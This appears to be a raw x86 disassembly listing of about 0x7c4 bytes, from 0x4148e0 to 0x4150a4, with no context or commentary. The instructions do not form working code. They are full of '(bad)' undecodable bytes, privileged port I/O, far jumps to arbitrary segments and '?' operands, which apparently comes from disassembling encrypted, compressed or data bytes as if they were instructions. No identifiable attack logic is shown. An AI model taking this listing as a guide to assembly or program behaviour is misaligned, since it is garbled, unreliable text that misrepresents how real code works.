  4148e0:	push   ds
  4148e1:	push   eax
  4148e2:	xor    ebp,ebx
  4148e4:	mov    esp,ecx
  4148e6:	popf   
  4148e7:	mov    al,0x2b
  4148e9:	lea    edx,[eax-0x3c]
  4148ec:	sbb    bl,BYTE PTR [ebp+0x78]
  4148ef:	ror    BYTE PTR [edx],0x88
  4148f2:	out    0x41,eax
  4148f4:	xlat   BYTE PTR ds:[ebx]
  4148f5:	rcr    DWORD PTR ds:[ebx+0x3a2530a3],cl
  4148fc:	cmp    al,0x20
  4148fe:	fdiv   st(1),st
  414900:	in     eax,dx
  414901:	and    eax,0x28dde189
  414906:	push   cs
  414907:	pop    edi
  414908:	cmp    al,0x6f
  41490a:	mov    ds:0x358098e1,eax
  41490f:	in     eax,0xeb
  414911:	push   ebx
  414912:	ss cs aad 0xce
  414916:	push   cs
  414917:	xor    edx,DWORD PTR [eax+0x47]
  41491a:	stos   DWORD PTR es:[edi],eax
  41491b:	inc    eax
  41491c:	xlat   BYTE PTR ds:[ebx]
  41491d:	pop    esp
  41491e:	out    0x42,eax
  414920:	xor    ecx,eax
  414922:	clc    
  414923:	pop    esi
  414924:	scas   eax,DWORD PTR es:[edi]
  414925:	shr    DWORD PTR [ecx],0x16
  414928:	mov    dl,BYTE PTR [edi-0x6b1586a1]
  41492e:	jmp    0x789e:0x6b0ff2c3
  414935:	div    eax
  414937:	sub    al,0x98
  414939:	adc    DWORD PTR [ebx-0x75],ebp
  41493c:	loop   0x414992
  41493e:	or     eax,0x24ad13f1
  414943:	lods   eax,DWORD PTR ds:[esi]
  414944:	(bad)  
  414945:	push   esp
  414946:	xor    BYTE PTR [eax-0x3f],ch
  414949:	and    edx,DWORD PTR gs:[esi-0x4a]
  41494d:	aas    
  41494e:	mov    ds:0xa48450fa,eax
  414953:	addr16 pop es
  414955:	pop    esp
  414956:	xchg   ebp,eax
  414957:	test   al,0x75
  414959:	aad    0x2
  41495b:	xchg   edi,eax
  41495c:	cmp    eax,0xa0dea0b
  414961:	dec    ebx
  414962:	shl    DWORD PTR [ebp+edx*2-0x45],cl
  414966:	out    dx,eax
  414967:	js     0x414999
  414969:	loop   0x414901
  41496b:	in     al,dx
  41496c:	sub    cl,bl
  41496e:	je     0x414989
  414970:	cmc    
  414971:	iret   
  414972:	jno    0x4149bc
  414974:	mov    ebp,0x38b5b839
  414979:	push   esi
  41497a:	sub    BYTE PTR [ecx+0x73],0x5e
  41497e:	cmp    DWORD PTR ds:0x44c2b1c8,edi
  414984:	das    
  414985:	ret    
  414986:	mov    DWORD PTR [eax],edi
  414988:	mov    eax,ds:0xc535bd47
  41498d:	test   al,0xb3
  41498f:	mov    al,0xc0
  414991:	stos   BYTE PTR es:[edi],al
  414992:	pop    ebx
  414993:	fdivr  DWORD PTR [esi+0x68925cc4]
  414999:	jo     0x4149f1
  41499b:	outs   dx,DWORD PTR ds:[esi]
  41499c:	and    DWORD PTR [ecx+edx*1-0x43c02d5d],edi
  4149a3:	pop    ss
  4149a4:	cmp    eax,0x45b78be6
  4149a9:	cld    
  4149aa:	(bad)  
  4149ac:	adc    BYTE PTR [esi-0x1e],bh
  4149af:	jne    0x414986
  4149b1:	stos   DWORD PTR es:[edi],eax
  4149b2:	pushf  
  4149b3:	mov    esp,DWORD PTR [edi+eax*2-0x75]
  4149b7:	jae    0x4149c5
  4149b9:	xor    BYTE PTR [eax-0x3c7f88d6],ch
  4149bf:	out    dx,eax
  4149c0:	lahf   
  4149c1:	das    
  4149c2:	iret   
  4149c3:	sub    edx,DWORD PTR [eax+0x6bd995ef]
  4149c9:	xor    BYTE PTR [ebx+0x3b],ch
  4149cc:	mov    BYTE PTR [edi],dl
  4149ce:	test   DWORD PTR ds:0x4a554c78,esi
  4149d4:	aam    0x87
  4149d6:	push   ebx
  4149d7:	(bad)  
  4149d8:	iret   
  4149d9:	push   esi
  4149da:	arpl   WORD PTR [eax-0x74],sp
  4149dd:	adc    al,0x87
  4149df:	in     eax,dx
  4149e0:	mov    ebp,edx
  4149e2:	mov    edi,0x9194d8
  4149e7:	sub    eax,0x714fd3f3
  4149ec:	pop    ss
  4149ed:	pop    edx
  4149ee:	add    al,0xe1
  4149f0:	clc    
  4149f1:	mov    ch,0x7e
  4149f3:	fimul  WORD PTR [edi+0xf]
  4149f6:	mov    ecx,0xe86449e1
  4149fb:	outs   dx,BYTE PTR ds:[esi]
  4149fc:	addr16 or cl,0x22
  414a00:	push   esp
  414a01:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414a02:	sbb    esp,DWORD PTR [ecx-0x69]
  414a05:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414a06:	ds call 0x770aa4db
  414a0c:	repnz adc al,0x81
  414a0f:	pop    ds
  414a10:	test   ebx,0xcd0973d
  414a16:	data16 cmp BYTE PTR ds:[ecx+eax*1],bh
  414a1b:	fisub  WORD PTR [edx-0x5eda74a]
  414a21:	sbb    BYTE PTR [edx+0x5be2d531],0xc2
  414a28:	xchg   ecx,eax
  414a29:	test   al,0xb9
  414a2b:	sub    DWORD PTR [ebx],esp
  414a2d:	mov    esp,0xf1a222c3
  414a32:	jle    0x414a29
  414a34:	aad    0x88
  414a36:	cmp    BYTE PTR [eax],0x72
  414a39:	rcr    BYTE PTR [ecx-0x66],0x5a
  414a3d:	fnstenv [edx-0x4c15a012]
  414a43:	int3   
  414a44:	cmp    BYTE PTR [eax+0x1808ac57],0x5a
  414a4b:	(bad)  
  414a4c:	sbb    al,0x54
  414a4e:	push   eax
  414a4f:	cmp    esp,DWORD PTR [ebp-0x43]
  414a52:	inc    ebp
  414a53:	adc    DWORD PTR [ebx-0x68],ecx
  414a56:	pop    ss
  414a57:	imul   eax,DWORD PTR [eax],0x613e9ad8
  414a5d:	jbe    0x4149fa
  414a5f:	mov    cl,0x70
  414a61:	into   
  414a62:	(bad)  
  414a64:	sbb    edx,DWORD PTR [edi]
  414a66:	adc    BYTE PTR [edi+0x7f59e17],bl
  414a6c:	daa    
  414a6d:	call   0xa383:0x6a0f6d26
  414a74:	cld    
  414a75:	push   es
  414a76:	mov    cl,0x1a
  414a78:	xchg   esp,eax
  414a79:	daa    
  414a7a:	ja     0x414a88
  414a7c:	inc    edx
  414a7d:	repz jp 0x414afd
  414a80:	mov    dh,0x64
  414a82:	push   ds
  414a83:	xor    edi,DWORD PTR [esi+0x4084023a]
  414a89:	js     0x414a16
  414a8b:	(bad)  
  414a8d:	fs push edi
  414a8f:	pop    ss
  414a90:	shl    BYTE PTR [ecx-0xa0d66fe],cl
  414a96:	mov    esi,0x89895028
  414a9b:	test   edx,esi
  414a9d:	in     al,0x6d
  414a9f:	sbb    eax,0xb5b2e446
  414aa4:	and    cl,dl
  414aa6:	cs dec ecx
  414aa8:	arpl   dx,bx
  414aaa:	mov    gs:0x5661e655,ax
  414ab1:	cmp    ecx,DWORD PTR [esi-0x3adb36b7]
  414ab7:	das    
  414ab8:	sub    eax,0xe500622e
  414abd:	call   edx
  414abf:	dec    DWORD PTR [ecx]
  414ac1:	or     eax,0xe95c7559
  414ac6:	or     ch,BYTE PTR [ebx-0x136aab14]
  414acc:	ja     0x414b1f
  414ace:	and    BYTE PTR es:[esi],dh
  414ad1:	mov    cl,0xa7
  414ad3:	test   DWORD PTR [ebx+0x33],ebx
  414ad6:	pop    esp
  414ad7:	mov    esi,0x56051a07
  414adc:	loop   0x414b2a
  414ade:	pop    eax
  414adf:	push   ecx
  414ae0:	xor    al,0x3a
  414ae2:	mov    ds:0xe2b58017,eax
  414ae7:	mov    ds:0x4a586f1,al
  414aec:	sub    al,BYTE PTR [ecx]
  414aee:	pop    ecx
  414aef:	push   ds
  414af0:	out    dx,eax
  414af1:	pusha  
  414af2:	push   ebx
  414af3:	(bad)  
  414af4:	outs   dx,BYTE PTR ds:[esi]
  414af5:	jl     0x414aa9
  414af7:	je     0x414afd
  414af9:	mov    al,ds:0x430f00c3
  414afe:	mov    BYTE PTR [ebp-0x24],cl
  414b01:	push   0xffffffc1
  414b03:	ss inc eax
  414b05:	retf   0xd417
  414b08:	sub    al,0x1d
  414b0a:	sub    BYTE PTR [esi-0x2ffd6d5b],dl
  414b10:	mov    ds:0xdbdb08d1,eax
  414b15:	sbb    DWORD PTR [esi+0x54],0x8c185e03
  414b1c:	int    0xf6
  414b1e:	pop    esi
  414b1f:	push   ebp
  414b20:	xor    eax,0xa5dce83
  414b25:	mov    ch,ah
  414b27:	push   ss
  414b28:	mov    al,ds:0xc1ac3bad
  414b2d:	leave  
  414b2e:	and    edx,DWORD PTR [ecx+0x59]
  414b31:	clc    
  414b32:	sbb    BYTE PTR [esi-0xb],0x17
  414b36:	xchg   DWORD PTR [edi],edi
  414b38:	jle    0x414afa
  414b3a:	mov    bh,0x2c
  414b3c:	pop    ebp
  414b3d:	adc    al,cl
  414b3f:	pusha  
  414b40:	push   cs
  414b41:	xchg   esp,eax
  414b42:	fidiv  DWORD PTR [edx]
  414b44:	dec    eax
  414b45:	std    
  414b46:	test   BYTE PTR [edx],al
  414b48:	(bad)  
  414b49:	xchg   esp,eax
  414b4a:	push   ss
  414b4b:	mov    edx,0xb1d55ab4
  414b50:	mov    esi,0x715f6401
  414b55:	xor    ebx,DWORD PTR [eax+0x32d5b1c4]
  414b5b:	cli    
  414b5c:	pop    ebp
  414b5d:	lea    eax,[ebx-0x4a]
  414b60:	xchg   BYTE PTR ds:0x3d76f97e,ah
  414b66:	arpl   WORD PTR [ecx-0x73],bx
  414b69:	cld    
  414b6a:	mov    esi,cs
  414b6c:	jne    0x414b63
  414b6e:	xchg   esi,eax
  414b6f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414b70:	(bad)  
  414b72:	shl    bl,1
  414b74:	add    eax,0x7ff5c514
  414b79:	mov    bl,0x5d
  414b7b:	or     edx,0x4ebbdb98
  414b81:	sbb    DWORD PTR [esp+ecx*4+0x26749c19],eax
  414b88:	ins    DWORD PTR es:[edi],dx
  414b89:	mov    al,0xd1
  414b8b:	jns    0x414bf2
  414b8d:	mov    ecx,0xb8658b88
  414b92:	push   es
  414b93:	mov    eax,0x8305068d
  414b98:	imul   ecx,DWORD PTR [edi+0x57],0x47
  414b9c:	enter  0xaf6a,0x26
  414ba0:	fdiv   DWORD PTR [eax-0x80]
  414ba3:	lea    ebx,[ebx]
  414ba5:	xor    ecx,edx
  414ba7:	mov    ds:0xdc8ffa6c,eax
  414bac:	fild   DWORD PTR [esi-0x7f7cd3f3]
  414bb2:	cwde   
  414bb3:	pop    esi
  414bb4:	call   0xfa1e88c
  414bb9:	out    dx,al
  414bba:	sub    bh,ch
  414bbc:	call   0x94eee00
  414bc1:	add    eax,0x53ddf36f
  414bc6:	and    BYTE PTR [ecx-0x35],cl
  414bc9:	or     ebx,esi
  414bcb:	repz jl 0x414b54
  414bce:	repnz mov edi,0xd2d93722
  414bd4:	push   ebx
  414bd5:	mov    ecx,0x818d2149
  414bda:	mov    cl,0x3e
  414bdc:	or     DWORD PTR [ecx*8-0xbe71f13],eax
  414be3:	mov    edi,0x8370cc3a
  414be8:	mov    DWORD PTR [esi-0x3ecd1cbb],esi
  414bee:	pop    ebx
  414bef:	rol    cl,0x9e
  414bf2:	jnp    0x414c3a
  414bf4:	lods   al,BYTE PTR ds:[esi]
  414bf5:	cwde   
  414bf6:	pop    esp
  414bf7:	shl    BYTE PTR [edx+esi*2+0x2a84f634],1
  414bfe:	nop
  414bff:	xchg   edi,eax
  414c00:	test   eax,0x2b9da8b4
  414c05:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414c06:	jp     0x414be2
  414c08:	(bad)  
  414c09:	out    0xcc,al
  414c0b:	stos   DWORD PTR es:[edi],eax
  414c0c:	xchg   DWORD PTR [edi+0x3e],edx
  414c0f:	mov    dh,0xc
  414c11:	adc    al,0xb0
  414c13:	aas    
  414c14:	push   ebx
  414c15:	iret   
  414c16:	adc    ah,BYTE PTR [esi+eiz*8+0x26d46b58]
  414c1d:	inc    eax
  414c1e:	add    esp,DWORD PTR [edi]
  414c20:	mov    ah,0xa0
  414c22:	fisub  DWORD PTR [eax]
  414c24:	lahf   
  414c25:	iret   
  414c26:	push   ebx
  414c27:	ret    0xb82a
  414c2a:	xor    cl,BYTE PTR ds:0x3ab02ab1
  414c30:	add    BYTE PTR ds:0xd056a37c,cl
  414c36:	xor    ch,BYTE PTR [ebx+esi*8-0x77]
  414c3a:	out    dx,al
  414c3b:	dec    ebp
  414c3c:	sbb    bh,BYTE PTR [edx-0x3287d73d]
  414c42:	cld    
  414c43:	push   eax
  414c44:	repnz dec esp
  414c46:	inc    esp
  414c47:	pop    eax
  414c48:	inc    esi
  414c49:	lds    ebx,FWORD PTR [ebx+0xf]
  414c4c:	shr    DWORD PTR [edx+0x2a],cl
  414c4f:	jno    0x414be8
  414c51:	mov    WORD PTR [ecx+0x6f],ds
  414c54:	dec    edi
  414c55:	outs   dx,BYTE PTR ds:[esi]
  414c56:	jl     0x414c3d
  414c58:	retf   0x49be
  414c5b:	out    dx,al
  414c5c:	adc    eax,0x59bfa1ee
  414c61:	ins    BYTE PTR es:[edi],dx
  414c62:	ja     0x414c9b
  414c64:	jns    0x414bea
  414c66:	leave  
  414c67:	jb     0x414ca0
  414c69:	cmp    bh,0x47
  414c6c:	mov    ch,0x13
  414c6e:	xor    ah,BYTE PTR [eax+0x2e]
  414c71:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414c72:	fcom   QWORD PTR [esi+0x28]
  414c75:	je     0x414ca8
  414c77:	dec    ebp
  414c78:	mov    dh,0x95
  414c7a:	pop    edi
  414c7b:	out    dx,eax
  414c7c:	xchg   esi,eax
  414c7d:	mov    dh,0xf6
  414c7f:	xchg   edx,eax
  414c80:	and    al,0xa6
  414c82:	sbb    eax,0x3e802fea
  414c87:	dec    ecx
  414c88:	xor    BYTE PTR [ebx+0x60b0d5b0],ah
  414c8e:	clc    
  414c8f:	mov    dl,0xd0
  414c91:	loopne 0x414cee
  414c93:	add    eax,esi
  414c95:	and    al,0xa9
  414c97:	addr16 out dx,ax
  414c9a:	inc    edi
  414c9b:	mov    esp,0x49b3ab5c
  414ca0:	pop    es
  414ca1:	cs pop ecx
  414ca3:	mov    dh,0xa9
  414ca5:	dec    ecx
  414ca6:	sub    ch,al
  414ca8:	lods   al,BYTE PTR ds:[esi]
  414ca9:	es aaa 
  414cab:	(bad)  
  414cac:	(bad)  
  414cad:	push   ebx
  414cae:	js     0x414ced
  414cb0:	push   es
  414cb1:	cmp    ah,BYTE PTR [edi]
  414cb3:	ins    BYTE PTR es:[edi],dx
  414cb4:	(bad)  
  414cb6:	jp     0x414c3c
  414cb8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414cb9:	mov    eax,ecx
  414cbb:	add    bl,ch
  414cbd:	stc    
  414cbe:	ins    DWORD PTR es:[edi],dx
  414cbf:	cmp    ecx,DWORD PTR [esi+0x26]
  414cc2:	out    0xdd,eax
  414cc4:	pop    edi
  414cc5:	sar    DWORD PTR [edx-0x11c063a4],cl
  414ccb:	fadd   QWORD PTR [edx-0x64]
  414cce:	mov    bl,BYTE PTR [edx]
  414cd0:	(bad)  [ecx]
  414cd2:	pop    esi
  414cd3:	inc    edx
  414cd4:	mov    ds:0x464ad05b,eax
  414cd9:	je     0x414d04
  414cdb:	inc    eax
  414cdc:	push   edi
  414cdd:	xchg   edi,eax
  414cde:	sbb    DWORD PTR [ebx],0x70
  414ce1:	fs inc ebx
  414ce3:	lods   eax,DWORD PTR ds:[esi]
  414ce4:	stos   BYTE PTR es:[edi],al
  414ce5:	cmp    eax,0xdf835dd1
  414cea:	ss fsubr st,st(0)
  414ced:	or     dl,BYTE PTR [eax]
  414cef:	and    dh,bl
  414cf1:	jns    0x414ce3
  414cf3:	xchg   edi,eax
  414cf4:	adc    esp,DWORD PTR [ecx]
  414cf6:	jo     0x414d6e
  414cf8:	sahf   
  414cf9:	mov    dl,0x60
  414cfb:	mov    bh,0x18
  414cfd:	(bad)  
  414cfe:	jp     0x414cce
  414d00:	cld    
  414d01:	or     edx,DWORD PTR [edx+0x56]
  414d04:	sub    eax,0xf8f966b2
  414d09:	shr    BYTE PTR [ebp-0x50cd59d0],0x58
  414d10:	xchg   DWORD PTR [edx],ecx
  414d12:	repz pop ebx
  414d14:	js     0x414cd8
  414d16:	stos   DWORD PTR es:[edi],eax
  414d17:	xchg   edi,eax
  414d18:	in     eax,0x4f
  414d1a:	pop    edi
  414d1b:	add    DWORD PTR [ebx],edi
  414d1d:	cmp    BYTE PTR [edi+0x4f],ch
  414d20:	pop    edx
  414d21:	stos   DWORD PTR es:[edi],eax
  414d22:	out    0xb5,al
  414d24:	in     eax,0xe0
  414d26:	dec    ecx
  414d27:	mov    ch,0x71
  414d29:	add    ch,BYTE PTR [ebp+0x1e]
  414d2c:	push   0xffffffb1
  414d2e:	push   edi
  414d2f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414d30:	shl    DWORD PTR [ecx+0x31],1
  414d33:	ja     0x414d66
  414d35:	ins    BYTE PTR es:[edi],dx
  414d36:	fild   QWORD PTR [edx-0x72]
  414d39:	test   eax,0x77230837
  414d3e:	xchg   ecx,eax
  414d3f:	fs lock jae 0x414d29
  414d43:	mov    ecx,0x15a3f93f
  414d48:	inc    edx
  414d49:	add    eax,0x53fc9be8
  414d4e:	pop    esi
  414d4f:	(bad)
  414d52:	je     0x414dc0
  414d54:	shl    BYTE PTR [edi-0x54],1
  414d57:	popa   
  414d58:	push   ds
  414d59:	icebp  
  414d5a:	out    0x18,eax
  414d5c:	fistp  DWORD PTR [edx+0x29]
  414d5f:	sbb    BYTE PTR [esi+0x43],dh
  414d62:	das    
  414d63:	mul    DWORD PTR [edi-0x67826205]
  414d69:	xor    ch,ah
  414d6b:	cmp    BYTE PTR [ebx+0x35],bl
  414d6e:	dec    eax
  414d6f:	pop    ebx
  414d70:	xor    BYTE PTR [eax-0x61],ah
  414d73:	shr    ah,0x5e
  414d76:	add    al,0xfc
  414d78:	jae    0x414d27
  414d7a:	cmp    BYTE PTR [edi+0x42711426],bl
  414d80:	inc    edx
  414d81:	pop    edi
  414d82:	mov    esp,0x5d22751a
  414d87:	cdq    
  414d88:	jbe    0x414d9d
  414d8a:	outs   dx,DWORD PTR ds:[esi]
  414d8b:	sbb    eax,0xd78f67f9
  414d90:	test   eax,0x4faf60ff
  414d95:	fld    TBYTE PTR [eax+0x1bfd4b81]
  414d9b:	loopne 0x414d8e
  414d9d:	in     eax,0xd3
  414d9f:	add    BYTE PTR fs:[eax],0x3c
  414da3:	(bad)  [edi+0x69dd3cc9]
  414da9:	xor    esp,DWORD PTR [esi-0x63]
  414dac:	pushf  
  414dad:	xor    DWORD PTR [edx-0x40],esp
  414db0:	pop    esp
  414db1:	aaa    
  414db2:	in     eax,0x4c
  414db4:	mov    ds:0x3d023f,al
  414db9:	jbe    0x414d9e
  414dbb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414dbc:	sbb    al,BYTE PTR [eax]
  414dbe:	adc    eax,0xb33de978
  414dc3:	loope  0x414db5
  414dc5:	dec    ecx
  414dc6:	and    DWORD PTR [esi+0x63],0xffffff9b
  414dca:	jae    0x414e49
  414dcc:	mov    edi,DWORD PTR [edx+0x4e370a19]
  414dd2:	clc    
  414dd3:	add    BYTE PTR [eax+0x6d],bl
  414dd6:	and    eax,0x97952ee
  414ddb:	jae    0x414de4
  414ddd:	clc    
  414dde:	je     0x414dc4
  414de0:	ins    BYTE PTR es:[edi],dx
  414de1:	lds    ecx,FWORD PTR [esi-0x2e]
  414de4:	fs fs (bad) 
  414de7:	test   eax,0x777e4048
  414dec:	ins    DWORD PTR es:[edi],dx
  414ded:	pop    edx
  414dee:	mov    ?,WORD PTR [ebp-0x44ac7ff4]
  414df4:	popa   
  414df5:	xchg   ecx,eax
  414df6:	data16 ficom WORD PTR [esi-0x19]
  414dfa:	cmp    ah,BYTE PTR [edi]
  414dfc:	inc    esp
  414dfd:	popf   
  414dfe:	sub    eax,0xbc077070
  414e03:	push   edi
  414e04:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414e05:	shr    cl,1
  414e07:	and    DWORD PTR [eax],ebx
  414e09:	xchg   edi,eax
  414e0a:	sub    eax,0x8dd6a0db
  414e0f:	sub    eax,0xefe732c4
  414e14:	scas   eax,DWORD PTR es:[edi]
  414e15:	shl    esi,cl
  414e17:	scas   eax,DWORD PTR es:[edi]
  414e18:	out    dx,eax
  414e19:	inc    eax
  414e1a:	cmp    DWORD PTR [ebx-0x4272ced7],ebx
  414e20:	pop    ds
  414e21:	pop    esp
  414e22:	jp     0x414e2a
  414e24:	push   esp
  414e25:	jl     0x414e1d
  414e27:	dec    ecx
  414e28:	loope  0x414e9b
  414e2a:	leave  
  414e2b:	pcmpgtb mm2,QWORD PTR [eax-0x64cbc8ab]
  414e32:	loope  0x414dc2
  414e34:	loope  0x414de5
  414e36:	jo     0x414e5b
  414e38:	push   esp
  414e39:	inc    ecx
  414e3a:	mov    bl,0xf3
  414e3c:	icebp  
  414e3d:	jg     0x414dfc
  414e3f:	daa    
  414e40:	sub    edi,DWORD PTR [ecx+eiz*8]
  414e43:	sub    cl,0x8d
  414e46:	cs es xchg ecx,eax
  414e49:	push   esi
  414e4a:	stc    
  414e4b:	adc    eax,0xf2d0b4c0
  414e50:	jp     0x414de2
  414e52:	test   eax,0x6791605
  414e57:	sti    
  414e58:	cmc    
  414e59:	or     esp,ecx
  414e5b:	gs ins BYTE PTR es:[edi],dx
  414e5d:	cmp    BYTE PTR [esi],bh
  414e5f:	test   eax,0xbaddb2c7
  414e64:	mov    ds:0xad4380f2,eax
  414e69:	popa   
  414e6a:	mov    ch,0x92
  414e6c:	(bad)  
  414e6d:	cs cmpxchg ebx,ecx
  414e71:	repz sar al,0xc6
  414e75:	sub    al,0x1c
  414e77:	mov    ebx,0xd4f8bcbf
  414e7c:	push   0xffffffb5
  414e7e:	mov    ecx,0xb8c9c55e
  414e83:	cmp    esi,DWORD PTR [eax+edx*1]
  414e86:	and    BYTE PTR [eax+0x3afb4d88],0x2f
  414e8d:	cs inc edx
  414e8f:	cmp    al,0x83
  414e91:	mov    al,0x7
  414e93:	adc    DWORD PTR [eax-0x15],ecx
  414e96:	aaa    
  414e97:	cmp    cl,BYTE PTR [edi-0x2a]
  414e9a:	inc    esp
  414e9b:	(bad)  
  414e9d:	sub    eax,0x90bf1609
  414ea2:	ins    BYTE PTR es:[edi],dx
  414ea3:	mov    al,ds:0xae6ca9f8
  414ea8:	mov    al,0xd7
  414eaa:	les    eax,FWORD PTR [edi-0x55]
  414ead:	stc    
  414eae:	gs cmp cl,dl
  414eb1:	popa   
  414eb2:	shl    BYTE PTR [eax+0x7f],1
  414eb5:	xor    BYTE PTR [ecx],al
  414eb7:	or     eax,ebp
  414eb9:	hlt    
  414eba:	in     al,0x33
  414ebc:	cli    
  414ebd:	enter  0xa5c1,0x66
  414ec1:	nop
  414ec2:	fld    DWORD PTR [ecx]
  414ec4:	scas   al,BYTE PTR es:[edi]
  414ec5:	into   
  414ec6:	out    0x21,eax
  414ec8:	(bad)  
  414ec9:	out    dx,eax
  414eca:	add    BYTE PTR [ebx],al
  414ecc:	sub    eax,0xb1cb2752
  414ed1:	lds    esp,FWORD PTR [edi+0x68f05d49]
  414ed7:	call   DWORD PTR [ebp+0x3ce9544a]
  414edd:	out    0xa6,al
  414edf:	push   esp
  414ee0:	xor    DWORD PTR [ecx+0x48],ebx
  414ee3:	cmp    eax,ebx
  414ee5:	sbb    dh,BYTE PTR ds:0x7c3d9b2a
  414eeb:	in     al,dx
  414eec:	jmp    DWORD PTR ds:0xf57622cb
  414ef2:	push   esp
  414ef3:	cs push eax
  414ef5:	sub    al,0x8c
  414ef7:	jp     0x414f59
  414ef9:	xchg   esi,eax
  414efa:	sub    ebx,DWORD PTR [ebx+0x7f185e00]
  414f00:	fsub   QWORD PTR [eax-0x44]
  414f03:	sub    eax,0x99ae1f9b
  414f08:	jmp    0x39c50758
  414f0d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414f0e:	sub    eax,0x9438d74f
  414f13:	push   DWORD PTR [edi]
  414f15:	scas   eax,DWORD PTR es:[edi]
  414f16:	(bad)  
  414f19:	shr    DWORD PTR [ebx+0x2320268c],0x4e
  414f20:	push   es
  414f21:	fs push 0x95d189ea
  414f27:	adc    esp,edx
  414f29:	in     al,dx
  414f2a:	pop    ebx
  414f2b:	gs loop 0x414f1b
  414f2e:	dec    ebx
  414f2f:	bound  edx,QWORD PTR [esi-0x19]
  414f32:	mov    eax,ds:0x39a05dab
  414f37:	test   al,0x93
  414f39:	sbb    al,BYTE PTR [edx+ebp*4]
  414f3c:	sbb    bh,bl
  414f3e:	add    BYTE PTR [edi+0x60],bh
  414f41:	add    DWORD PTR [esi+0x39161ae6],ecx
  414f47:	call   0xb5a7c79e
  414f4c:	sahf   
  414f4d:	sub    eax,0x85a0ca1
  414f52:	cmp    ebx,eax
  414f54:	sub    al,0xcc
  414f56:	pop    esi
  414f57:	int    0x6b
  414f59:	sar    BYTE PTR [edi-0x4e7d575b],cl
  414f5f:	(bad)  
  414f60:	and    al,0x75
  414f62:	cmp    ah,BYTE PTR [ebp-0x247ed9fd]
  414f68:	in     al,dx
  414f69:	ja     0x414f97
  414f6b:	xchg   esi,eax
  414f6c:	or     dh,BYTE PTR [edi-0x525d5bb0]
  414f72:	ret    
  414f73:	mov    bl,0x9d
  414f75:	fimul  DWORD PTR [edi+eax*4+0x57]
  414f79:	add    BYTE PTR gs:[esi+0x2a],ch
  414f7d:	inc    edx
  414f7e:	cmp    ch,BYTE PTR [ebp+0x127e2c94]
  414f84:	add    ah,BYTE PTR [eax+0x6113bdd2]
  414f8a:	sub    dl,BYTE PTR [edx+0x46771c46]
  414f90:	mov    bh,BYTE PTR [ecx+0x6d]
  414f93:	lock pop edx
  414f95:	sbb    edi,DWORD PTR [esi+0x45]
  414f98:	adc    al,0xaa
  414f9a:	fld    st(1)
  414f9c:	rdtsc  
  414f9e:	jp     0x414fae
  414fa0:	(bad)
  414fa3:	adc    eax,0x45325fe7
  414fa8:	xchg   DWORD PTR [ebx+0x3587a1b6],ebx
  414fae:	xchg   edi,eax
  414faf:	(bad)  
  414fb0:	fcmovu st,st(7)
  414fb2:	or     al,0xce
  414fb4:	jae    0x415031
  414fb6:	dec    ebp
  414fb7:	(bad)  [ebp-0x2dd2f509]
  414fbd:	inc    ebx
  414fbe:	mov    dh,0xac
  414fc0:	hlt    
  414fc1:	and    eax,0x3c24556b
  414fc6:	rol    DWORD PTR [ecx],1
  414fc8:	xor    edi,ebx
  414fca:	mov    eax,0x1f1e4ecd
  414fcf:	mov    bh,0x92
  414fd1:	out    dx,eax
  414fd2:	xor    BYTE PTR [edx+0x6c],0x30
  414fd6:	aad    0xfd
  414fd8:	(bad)  
  414fd9:	mov    WORD PTR [edi+0x11],?
  414fdc:	stos   BYTE PTR es:[edi],al
  414fdd:	dec    esi
  414fde:	xchg   esi,eax
  414fdf:	(bad)  
  414fe0:	adc    BYTE PTR [ebx],0x23
  414fe3:	sbb    al,0xc1
  414fe5:	dec    edi
  414fe6:	jp     0x41504d
  414fe8:	and    ah,bh
  414fea:	xchg   DWORD PTR [eax-0x1e2dd15c],ebx
  414ff0:	mov    esi,0x8794da63
  414ff5:	cdq    
  414ff6:	xor    eax,0xb4a4a588
  414ffb:	mov    ebp,0x60a8f290
  415000:	sar    BYTE PTR [edi+0x39],0x76
  415004:	pop    ds
  415005:	scas   eax,DWORD PTR es:[edi]
  415006:	mov    al,ds:0x56c30d45
  41500b:	push   ecx
  41500c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41500d:	aad    0xbe
  41500f:	mov    al,ds:0x8caeb42
  415014:	jmp    0xd5fe:0x73a70b91
  41501b:	push   es
  41501c:	rcl    DWORD PTR [ecx-0x7],0xc2
  415020:	ins    BYTE PTR es:[edi],dx
  415021:	xchg   esi,eax
  415022:	in     eax,0x1c
  415024:	bound  ecx,QWORD PTR [eax+0x2c]
  415027:	add    al,0x69
  415029:	mov    ds:0x4fcf5c5c,eax
  41502e:	mov    bl,0x19
  415030:	adc    ecx,0x35
  415033:	or     eax,0xa298d102
  415038:	les    esp,FWORD PTR [edx-0x40]
  41503b:	sub    BYTE PTR ds:0xb3c3c9da,0x64
  415042:	hlt    
  415043:	stos   BYTE PTR es:[edi],al
  415044:	sbb    esp,DWORD PTR [edi-0x52e03204]
  41504a:	xor    DWORD PTR [edi],0x1e
  41504d:	inc    esp
  41504e:	jb     0x4150b6
  415050:	icebp  
  415051:	or     eax,0x4bb5c0da
  415056:	adc    eax,0x97ac447b
  41505b:	cwde   
  41505c:	jno    0x415013
  41505e:	mov    cl,0xaa
  415060:	enter  0xefb0,0xce
  415064:	inc    esi
  415065:	aam    0xc
  415067:	add    ecx,DWORD PTR [edi]
  415069:	pop    eax
  41506a:	or     eax,0x90e62359
  41506f:	inc    ebp
  415070:	mov    ds:0xb344c675,eax
  415075:	push   esp
  415076:	imul   ebp,ebx,0x1
  415079:	jle    0x415042
  41507b:	mov    ebp,DWORD PTR [edi+0x45f6f6c9]
  415081:	push   cs
  415082:	aam    0xc7
  415084:	test   DWORD PTR [ebx],0xaa3cc7c8
  41508a:	xor    cl,BYTE PTR [eax+0x7bbd4a36]
  415090:	call   0xd79609f7
  415095:	mov    al,0xa1
  415097:	xchg   ebx,eax
  415098:	jle    0x4150db
  41509a:	xor    eax,0x574e3e68
  41509f:	sub    ebp,esp
  4150a1:	ret    0x161f
  4150a4:	push   es
